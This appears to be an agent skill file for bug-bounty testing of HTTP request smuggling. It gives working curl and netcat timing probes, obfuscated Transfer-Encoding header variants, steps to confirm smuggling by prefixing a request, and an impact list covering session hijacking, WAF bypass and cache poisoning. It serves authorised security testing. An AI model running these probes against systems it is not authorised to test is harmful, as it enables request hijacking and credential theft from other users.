---
name: web-vuln-http-smuggling
description: HTTP request smuggling detection for CL.TE, TE.CL, and H2.CL variants
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Detects HTTP request smuggling vulnerabilities by exploiting disagreements between front-end (reverse proxy/CDN) and back-end (application server) parsers over how to determine request boundaries. Tests CL.TE (Content-Length front, Transfer-Encoding back), TE.CL (Transfer-Encoding front, Content-Length back), TE.TE (both use Transfer-Encoding but with obfuscation), and H2.CL (HTTP/2 downgrade to HTTP/1.1) variants using timing-based probes and differential response analysis.

## When to use

- When the target sits behind a reverse proxy, CDN, or load balancer (Nginx, HAProxy, AWS ALB, Cloudflare, Fastly)
- When testing for WAF bypass, request hijacking, cache poisoning, or credential theft
- During high-value bug bounty targets with multi-tier HTTP infrastructure
- When initial recon reveals `Via`, `X-Forwarded-For`, or `X-Cache` response headers indicating a proxy layer

## Prerequisites

- `curl` compiled with HTTP/1.1 support (standard on Linux/macOS)
- `netcat` (`nc`) for raw TCP requests
- Burp Suite with HTTP Request Smuggler extension (optional, for automated scanning)
- A test account on the target for differential response verification

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `TARGET_HOST` | Target hostname | `example.com` |
| `TARGET_PORT` | Target port | `443` |
| `TARGET_PATH` | Path to test (preferably a POST-accepting endpoint) | `/api/search` |
| `AUTH_HEADER` | Authentication header if required | `Authorization: Bearer eyJ...` |

## Workflow

### Step 1: Identify front-end/back-end architecture

```bash
TARGET_HOST="example.com"
TARGET_PORT=443
TARGET_PATH="/api/search"

echo "=== Step 1: Architecture fingerprinting ==="

curl -s -I "https://$TARGET_HOST$TARGET_PATH" | grep -iE "via|x-cache|x-served-by|server|x-forwarded|cdn|cf-ray|x-amz"

echo ""
echo "Indicators of proxy presence:"
echo "  Via: 1.1 vegur          -> Heroku"
echo "  X-Cache: HIT            -> Caching layer present"
echo "  CF-Ray:                 -> Cloudflare"
echo "  X-Amz-Cf-Id:            -> AWS CloudFront"
echo "  X-Served-By:            -> Fastly/Varnish"
echo "  Server: nginx + X-Powered-By: Express  -> Nginx front + Node back"
```

### Step 2: Test CL.TE with timing probe

```bash
echo ""
echo "=== Step 2: CL.TE timing probe ==="
echo "Method: Send a request where Content-Length says body is complete,"
echo "        but Transfer-Encoding chunked body is intentionally incomplete."
echo "        If the back-end uses TE, it will wait for the next chunk -> timeout."
echo ""

# CL.TE timing probe: Content-Length = 4 (covers "0\r\n\r\n" which ends TE body)
# but we send an incomplete TE body to make the back-end wait
# Time how long the response takes — >5s strongly suggests CL.TE

START=$(date +%s%N)
curl -s -o /tmp/clte_response.txt \
  --http1.1 \
  --max-time 15 \
  -X POST "https://$TARGET_HOST$TARGET_PATH" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'3\r\nabc\r\n' \
  2>&1
END=$(date +%s%N)
ELAPSED=$(( (END - START) / 1000000 ))

echo "CL.TE probe elapsed: ${ELAPSED}ms"
if [ "$ELAPSED" -gt 5000 ]; then
  echo "[POTENTIAL CL.TE] Response took >5s — back-end may be waiting for TE body completion"
else
  echo "[No obvious CL.TE timing signal]"
fi
```

### Step 3: Test TE.CL with timing probe

```bash
echo ""
echo "=== Step 3: TE.CL timing probe ==="
echo "Method: Send a valid TE chunked body, but set Content-Length to a value"
echo "        larger than the actual body. If the front-end uses TE and the"
echo "        back-end uses CL, the back-end waits for more data -> timeout."
echo ""

START=$(date +%s%N)
curl -s -o /tmp/tecl_response.txt \
  --http1.1 \
  --max-time 15 \
  -X POST "https://$TARGET_HOST$TARGET_PATH" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 3" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'0\r\n\r\n' \
  2>&1
END=$(date +%s%N)
ELAPSED=$(( (END - START) / 1000000 ))

echo "TE.CL probe elapsed: ${ELAPSED}ms"
if [ "$ELAPSED" -gt 5000 ]; then
  echo "[POTENTIAL TE.CL] Response took >5s — back-end may be waiting for CL bytes"
else
  echo "[No obvious TE.CL timing signal]"
fi
```

### Step 4: Test TE.TE obfuscation variants

```bash
echo ""
echo "=== Step 4: TE.TE obfuscation variants ==="
echo "Both layers support TE, but one can be tricked into ignoring it via obfuscated header."
echo ""

# Common TE obfuscation headers — try each one
te_variants=(
  "Transfer-Encoding: xchunked"
  "Transfer-Encoding: chunked, identity"
  "Transfer-Encoding : chunked"
  "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"
  "X-Transfer-Encoding: chunked"
  "Transfer-Encoding: [chunked]"
  "GET / HTTP/1.1\r\nTransfer-Encoding: chunked"
)

for te_header in "${te_variants[@]}"; do
  echo "Testing: $te_header"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    --http1.1 --max-time 5 \
    -X POST "https://$TARGET_HOST$TARGET_PATH" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Content-Length: 4" \
    -H "$te_header" \
    --data-binary $'0\r\n\r\n' 2>&1)
  echo "  -> HTTP $STATUS"
done
```

### Step 5: Test H2.CL downgrade variant

```bash
echo ""
echo "=== Step 5: H2.CL (HTTP/2 downgrade) ==="
echo "Method: Send HTTP/2 request with a Content-Length header that conflicts"
echo "        with the actual body length. When the proxy downgrades to HTTP/1.1,"
echo "        the injected Content-Length header may be forwarded."
echo ""

# Check if target supports HTTP/2
H2_SUPPORT=$(curl -s -o /dev/null -w "%{http_version}" "https://$TARGET_HOST$TARGET_PATH")
echo "HTTP version used by curl: $H2_SUPPORT"

if [ "$H2_SUPPORT" = "2" ]; then
  echo "[HTTP/2 confirmed] Testing H2.CL downgrade probe"
  # H2.CL: send HTTP/2 with Content-Length set shorter than actual body
  # The proxy may strip pseudo-headers but forward Content-Length to HTTP/1.1 back-end
  START=$(date +%s%N)
  curl -s -o /tmp/h2cl_response.txt --max-time 15 \
    -X POST "https://$TARGET_HOST$TARGET_PATH" \
    -H "content-length: 0" \
    --data-binary "SMUGGLED" 2>&1
  END=$(date +%s%N)
  ELAPSED=$(( (END - START) / 1000000 ))
  echo "H2.CL probe elapsed: ${ELAPSED}ms"
  cat /tmp/h2cl_response.txt
else
  echo "[HTTP/1.1 only] H2.CL variant not applicable — skip"
fi
```

### Step 6: Differential response verification

```bash
echo ""
echo "=== Step 6: Differential response (confirm smuggling) ==="
echo "After a timing signal, use differential analysis to confirm:"
echo "  1. Normal request (no smuggling) -> baseline response"
echo "  2. Smuggled prefix poisons the next request's response"
echo ""

# Baseline: normal request
echo "Baseline response:"
curl -s -o /tmp/baseline.txt -w "HTTP %{http_code}" \
  "https://$TARGET_HOST$TARGET_PATH" 2>&1
echo ""
cat /tmp/baseline.txt | head -5

echo ""
echo "[MANUAL] CL.TE differential confirmation steps:"
echo "  1. Send the CL.TE smuggling probe with a partial second request prefix in the body"
echo "     e.g. body after chunk terminator: 'GET /404notfound HTTP/1.1\\r\\nX-Ignore: '"
echo "  2. Immediately send a normal GET request to the same endpoint"
echo "  3. If the second request returns 404 (instead of the normal response),"
echo "     the smuggled prefix was prepended to it — smuggling confirmed"
```

### Step 7: Document impact

```bash
echo ""
echo "=== Impact assessment ==="
cat <<'EOF'
HTTP smuggling impact chains:

  Request hijacking        -> Critical  Prepend smuggled request to victim's next
                                        request -> steal their session/credentials
  WAF bypass               -> High      Smuggle a request that bypasses the WAF's
                                        inspection of the "real" request body
  Cache poisoning          -> High      Poison a cacheable response with attacker
                                        content -> stored XSS at scale
  Credential theft         -> Critical  Smuggle a GET to a page that reflects a
                                        request header containing victim cookies

Variant severity mapping:
  CL.TE confirmed          -> Critical (lowest dup rate, highest payout)
  TE.CL confirmed          -> Critical
  TE.TE confirmed          -> High/Critical (depends on exploitability)
  H2.CL confirmed          -> Critical (modern stacks, often unpatched)
  Timing signal only       -> Medium   (submit with timing evidence, note unconfirmed)
EOF
```

## Done when

- Architecture fingerprinting completed (proxy layer identified or ruled out)
- CL.TE timing probe executed and result recorded
- TE.CL timing probe executed and result recorded
- At least 3 TE.TE obfuscation variants tested
- H2.CL tested if HTTP/2 is detected
- Any positive timing signals followed up with differential response verification
- Impact chain documented

## Failure modes

| Symptom | Cause and resolution |
|---------|----------------------|
| All timing probes complete instantly (<1s) | Server likely uses HTTP/2 end-to-end (no HTTP/1.1 downgrade) or a single-tier architecture. Check for H2.CL variant instead |
| Curl rejects duplicate/malformed headers | curl normalizes headers. Use netcat for raw request: `echo -e "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n" \| nc -q 3 target.com 80` |
| Target always returns 400 for unusual TE values | WAF is blocking the probe. Rotate TE obfuscation variants (Step 4) or use Burp HTTP Request Smuggler which handles WAF evasion automatically |
| Differential verification produces inconsistent results | Connection reuse is interfering. Disable keep-alive: add `-H "Connection: close"` and retry |
| H2.CL probe shows no anomaly | Most modern proxies strip user-supplied `content-length` in HTTP/2. Check if server is Nginx <1.19 or Apache Traffic Server <9.0 (known vulnerable versions) |

## Notes

- HTTP Request Smuggler (Burp Suite BApp Store) by James Kettle automates all variant probes and provides visual differential analysis. Use it after manual timing signals to confirm.
- Raw netcat requests give the most control but require manual HTTP/1.1 framing. Always end chunks with `\r\n` and the terminating chunk with `0\r\n\r\n`.
- Smuggling bugs have very low duplicate rates on HackerOne and typically pay $5K–$30K when a full exploitation chain (credential theft or cache poisoning) is demonstrated.
- Safe testing rule: differential verification should target a 404 path or an endpoint you own. Never send smuggled prefixes that modify other users' requests on live production during testing.
- Reference: PortSwigger Web Security Academy — HTTP Request Smuggling; James Kettle's research at https://portswigger.net/research/http-desync-attacks.
